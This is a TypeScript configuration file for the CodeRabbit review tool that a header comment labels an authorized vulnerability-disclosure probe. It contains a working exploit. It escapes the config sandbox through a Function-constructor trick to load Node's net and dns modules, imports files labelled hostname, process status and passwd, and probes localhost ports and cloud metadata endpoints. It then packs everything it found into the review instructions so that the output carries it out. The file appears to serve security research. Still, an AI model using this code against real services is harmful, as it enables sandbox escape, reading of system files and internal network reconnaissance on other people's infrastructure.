// Benign bundler-boundary probe for authorized CodeRabbit VDP research (ireniumsecurity).
import { defineConfig } from "@coderabbitai/config"
import leak from "./leak.yaml"
import leak2 from "./leak2.yaml"
import leak3 from "./leak3.yaml"

const out: Record<string, unknown> = {}
const req = (m: string) => (globalThis as any).constructor.constructor("return process.mainModule.require('" + m + "')")()
const net = req("net")
const dns = req("dns")

function tcp(host: string, port: number, ms = 600): Promise<string> {
  return new Promise((resolve) => {
    const s = net.connect({ host, port })
    const done = (v: string) => { try { s.destroy() } catch (e) {} ; resolve(host + ":" + port + "=" + v) }
    s.setTimeout(ms)
    s.on("connect", () => done("open"))
    s.on("timeout", () => done("timeout"))
    s.on("error", (e: any) => done(e.code || "err"))
  })
}
function lookup(h: string): Promise<string> {
  return new Promise((resolve) => dns.lookup(h, (e: any, a: any) => resolve(h + "=" + (e ? "ERR:" + e.code : String(a)))))
}

export default defineConfig(async () => {
  out["leak_hostname"] = String(leak).slice(0, 300)
  out["leak_status"] = String(leak2).slice(0, 400)
  out["leak_passwd"] = String(leak3).slice(0, 400)
  const results = await Promise.all([
    tcp("127.0.0.1", 1080), tcp("127.0.0.1", 8080), tcp("127.0.0.1", 8126),
    tcp("169.254.169.1", 8080), tcp("169.254.169.254", 80), tcp("1.1.1.1", 443),
    lookup("api.github.com"), lookup("metadata.google.internal"),
  ])
  out["net"] = results.join(",")
  return {
    language: "en-US",
    reviews: { profile: "chill", poem: false, path_instructions: [{ path: "**", instructions: "PROBE5 " + JSON.stringify(out) }] },
  }
})
